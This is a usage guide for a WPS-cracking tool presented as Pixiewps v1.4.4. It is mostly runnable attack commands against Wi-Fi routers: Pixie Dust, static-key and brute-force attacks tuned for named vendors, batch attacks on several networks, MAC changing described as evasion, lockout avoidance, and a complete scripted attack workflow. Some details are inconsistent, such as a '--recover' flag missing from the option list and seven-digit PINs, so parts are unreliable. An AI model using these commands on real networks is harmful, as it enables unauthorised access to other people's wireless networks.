# 📚 Usage Guide - Pixiewps v1.4.4

Complete usage guide with examples for all attack methods and options.

---

## 🚀 Quick Start

### Basic Pixie Dust Attack

```bash
# Simplest usage - auto-detect and attack
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF

# With verbose output
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Full debug information
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv
```

### Static PKE Vulnerability Attack

```bash
# Exploit static ephemeral keys (95% success)
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF --static-pke -vv

# With multiple attempts to detect static PKE
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF --static-pke --retry 3
```

---

## 📖 Command-Line Options

### Required Arguments

```
-i, --interface=<iface>     Wireless interface in monitor mode
-b, --bssid=<mac>           Target AP MAC address (format: AA:BB:CC:DD:EE:FF)
```

### Optional Arguments - Basic

```
-e, --essid=<ssid>          Target network name (for logging)
-c, --channel=<num>         Manually set channel (1-14 for 2.4GHz, 36-165 for 5GHz)
-f, --fixed                 Disable channel hopping (use with -c)
-5, --5ghz                  Use only 5GHz channels
-m, --mac=<mac>             Spoof attacker MAC address

-v, --verbose               Verbose output (-vv or -vvv for more)
-q, --quiet                 Quiet mode (only critical messages)
-h, --help                  Show help message
-V, --version               Show version information
```

### Advanced Options - Timing & Control

```
-p, --pin=<pin>             Specify PIN to test (4, 8, or arbitrary digits)
-d, --delay=<secs>          Delay between attempts [default: 1]
-l, --lock-delay=<secs>     Wait time if AP locks WPS [default: 60]
-x, --fail-wait=<secs>      Sleep after 10 failures [default: 0]
-r, --recurring-delay=<x:y> Sleep y seconds every x attempts
-g, --max-attempts=<num>    Quit after this many attempts
-t, --timeout=<secs>        Receive timeout [default: 10]
-T, --m57-timeout=<secs>    M5/M7 timeout [default: 0.40]
```

### Attack Methods

```
-K, -Z, --pixie-dust        Run Pixie Dust offline attack
--static-pke                Exploit static ephemeral keys
--hybrid                    Pixie Dust + brute-force hybrid
--brute-force               Standard WPS PIN brute-force
--retry=<num>               Retry failed attempts (2-10)
```

### Router-Specific Options

```
-S, --dh-small              Use small DH keys for speed (not for Realtek)
-w, --win7                  Mimic Windows 7 registrar
-A, --no-associate          Don't associate with AP (manual mode)
-N, --no-nacks              Don't send NACK for out-of-order packets
-E, --eap-terminate         Terminate each session with EAP FAIL
-J, --timeout-is-nack       Treat timeout as NACK (DIR-300/320)
-F, --ignore-fcs            Ignore frame checksum errors
-L, --ignore-locks          Ignore AP lock state
-M, --mac-changer           Change MAC last digit each attempt
```

### Session & Output

```
-s, --session=<file>        Restore previous session
-C, --exec=<cmd>            Execute command on success
-O, --output-file=<file>    Write packets to PCAP file
```

### Auto-Detection & Fingerprinting

```
--detect                    Auto-detect router model and vulnerability
--confidence=<0-100>        Filter results by detection confidence
--fuzzy-match               Enable fuzzy SSID/model matching
```

---

## 🎯 Common Attack Scenarios

### Scenario 1: Acer C60/C50 (Qualcomm IPQ)

```bash
# These routers use nonce-based seeds
sudo pixiewps -i wlan0mon -b AC:9E:17:xx:xx:xx \
  -e "YourSSID" \
  --detect \
  --retry 5 \
  -vv

# With Pixie Dust attack
sudo pixiewps -i wlan0mon -b AC:9E:17:xx:xx:xx \
  -K \
  -p 12345670 \
  -d 2 \
  --max-attempts 10
```

### Scenario 2: Tenda Modern (AC1200)

```bash
# These routers have time-based weak seeds
sudo pixiewps -i wlan0mon -b 64:64:4A:xx:xx:xx \
  -e "TendaWiFi" \
  -c 6 -f \
  --retry 3 \
  -d 1 \
  -vv

# Skip M2 validation (Tenda specific)
sudo pixiewps -i wlan0mon -b 64:64:4A:xx:xx:xx \
  --detect \
  -x 5 \
  -l 120
```

### Scenario 3: TP-Link Archer (AR9344)

```bash
# High vulnerability - use small DH keys
sudo pixiewps -i wlan0mon -b 7C:DD:90:xx:xx:xx \
  -e "TP-Link" \
  -S \
  -d 1 \
  --pixie-dust \
  -vvv

# With session recovery
sudo pixiewps -i wlan0mon -b 7C:DD:90:xx:xx:xx \
  -s /tmp/tplink-session.pkl \
  --recover \
  -vv
```

### Scenario 4: RTL819x (Generic Realtek)

```bash
# RTL routers: DO NOT USE SMALL DH KEYS (-S)
# Use standard settings
sudo pixiewps -i wlan0mon -b 98:03:8E:xx:xx:xx \
  -e "RTLRouter" \
  -d 2 \
  --retry 10 \
  -vv

# Test multiple PINs
sudo pixiewps -i wlan0mon -b 98:03:8E:xx:xx:xx \
  -p "1234567,1234568,1234569" \
  -d 1
```

### Scenario 5: Static PKE Vulnerability

```bash
# Detect and exploit static ephemeral keys (95% success)
sudo pixiewps -i wlan0mon -b 88:BD:09:xx:xx:xx \
  --static-pke \
  --detect \
  -vv

# Force static PKE exploitation with 3 attempts
sudo pixiewps -i wlan0mon -b 88:BD:09:xx:xx:xx \
  --static-pke \
  --retry 3 \
  -l 30 \
  -vvv
```

### Scenario 6: Multiple Targets (Batch Mode)

```bash
# Create target list
cat > targets.txt << EOF
AA:BB:CC:DD:EE:FF,Channel6,MySSID
11:22:33:44:55:66,Channel11,OtherSSID
EOF

# Attack multiple targets
for target in $(cat targets.txt | cut -d, -f1); do
  sudo pixiewps -i wlan0mon -b "$target" \
    --detect \
    --max-attempts 100 \
    -v
done
```

---

## 🔧 Advanced Usage

### Session Recovery

```bash
# Start attack and save session
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  --session /tmp/attack.session \
  -g 1000 \
  -v

# Later, resume the session
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  --session /tmp/attack.session \
  --recover \
  -v
```

### Timing Optimization

```bash
# Fast attack (minimal delays)
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -d 0.5 \
  -T 0.20 \
  -t 5 \
  -vv

# Conservative attack (high retry capability)
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -d 5 \
  -l 300 \
  -x 30 \
  -T 0.40 \
  -t 15 \
  -v
```

### MAC Address Spoofing

```bash
# Spoof attacker MAC
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -m 00:11:22:33:44:55 \
  -v

# Change MAC every 10 attempts (evasion)
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -M \
  -r "10:5" \
  -v
```

### PCAP Capture for Analysis

```bash
# Record all WPS packets to PCAP
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -O /tmp/wps_capture.pcap \
  -v

# Later analyze with Wireshark
wireshark /tmp/wps_capture.pcap
```

### Windows 7 Compatibility Mode

```bash
# Some APs respond better to Windows 7 registrar
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -w \
  -d 2 \
  -vv
```

### EAP Termination (For Problematic APs)

```bash
# Some APs lock if WPS isn't terminated properly
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -E \
  -d 3 \
  -x 30
```

---

## 📊 Monitoring & Analysis

### Check AP Vulnerability Status

```bash
# Quick scan (uses aircrack-ng wash)
sudo wash -i wlan0mon -s

# Detailed JSON output
sudo wash -i wlan0mon -j -s

# All APs including non-WPS
sudo wash -i wlan0mon -a -s
```

### Monitor Active Attack

```bash
# In separate terminal, monitor interface stats
sudo watch "iwconfig wlan0mon | grep -E 'ESSID|Channel|Signal'"

# Or use airodump-ng
sudo airodump-ng wlan0mon -b AA:BB:CC:DD:EE:FF
```

### Analyze Failed Attempts

```bash
# Run with debug mode
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -vvv 2>&1 | tee attack.log

# Analyze log for patterns
grep "NACK\|FAIL\|LOCK" attack.log | head -20
```

---

## 🎓 Example Attack Sequences

### Complete Attack Workflow

```bash
#!/bin/bash
# Complete attack workflow

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
INTERFACE="wlan0mon"

echo "[*] Starting Pixiewps v1.4.4 Attack"

# Step 1: Enable monitor mode
echo "[1] Enabling monitor mode..."
sudo airmon-ng start wlan0

# Step 2: Quick detection
echo "[2] Detecting router..."
sudo pixiewps -i $INTERFACE -b $TARGET_BSSID --detect -v

# Step 3: Try static PKE first (if detected)
echo "[3] Attempting static PKE exploitation..."
if sudo pixiewps -i $INTERFACE -b $TARGET_BSSID \
   --static-pke --max-attempts 10 -v; then
  echo "[+] Static PKE exploitation successful!"
  exit 0
fi

# Step 4: Try Pixie Dust
echo "[4] Attempting Pixie Dust attack..."
if sudo pixiewps -i $INTERFACE -b $TARGET_BSSID \
   -K --max-attempts 100 -vv; then
  echo "[+] Pixie Dust successful!"
  exit 0
fi

# Step 5: Fallback to brute-force
echo "[5] Falling back to brute-force..."
sudo pixiewps -i $INTERFACE -b $TARGET_BSSID \
  --brute-force --max-attempts 500 -d 1 -vv

echo "[*] Attack complete"
```

### Speed vs. Reliability Comparison

```bash
# FAST (but may fail)
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -d 0.5 -T 0.2 -t 5 -M -r "20:2"

# BALANCED (recommended)
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -d 1 -T 0.4 -t 10 -l 120 -x 10

# RELIABLE (high success)
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -d 3 -T 0.5 -t 15 -l 300 -x 30 -E
```

---

## 🚨 Troubleshooting

### "Interface Not in Monitor Mode"

```bash
# Fix monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Verify
iwconfig wlan0mon | grep Mode
# Should show: Mode:Monitor
```

### "No WPS Response"

```bash
# Try manual channel setting
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -c 6 -f \
  -A \
  -d 3 \
  -v

# Try Windows 7 mode
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -w \
  -d 2
```

### "AP Locked"

```bash
# Increase lock delay and retry
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -l 600 \
  -x 60 \
  -d 5
```

### "Too Many Failures"

```bash
# Check signal strength first
sudo airodump-ng wlan0mon | grep $BSSID

# If signal is weak, move closer or use external antenna
# Then try with increased timeouts
sudo pixiewps -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  -t 20 \
  -T 0.5 \
  -F \
  -N
```

---

## 📈 Performance Tips

### Maximize Speed

1. **Use Static PKE when available** (~5 seconds)
2. **Use Pixie Dust** (~30 seconds)
3. **Reduce delays** (set `-d 0.5 -T 0.2`)
4. **Increase timeouts carefully** (not too small)
5. **Use small DH keys** (`-S`) on vulnerable routers

### Maximize Reliability

1. **Increase delays** (set `-d 3 -T 0.5`)
2. **Use EAP terminate** (`-E`)
3. **Ignore FCS errors** (`-F`)
4. **Don't send NACKs** (`-N`)
5. **Increase lock delay** (`-l 300`)

---

## 📖 Exit Codes

```
0   Successful PIN recovery
1   PIN not found (all attempts failed)
2   Command-line error
3   Interface error
4   BSSID not found
5   Timeout error
10  Permission denied (run with sudo)
```

---

## ✨ Next Steps

- Read [FEATURES.md](FEATURES.md) for detailed feature explanations
- See [REAL_ATTACK_ANALYSIS.md](REAL_ATTACK_ANALYSIS.md) for real examples
- Check [STATIC_PKE_EXPLOITATION.md](STATIC_PKE_EXPLOITATION.md) for advanced techniques

---

**Status:** ✅ Usage guide for v1.4.4 complete  
**Last Updated:** May 23, 2026  
**Examples:** 30+ scenarios documented
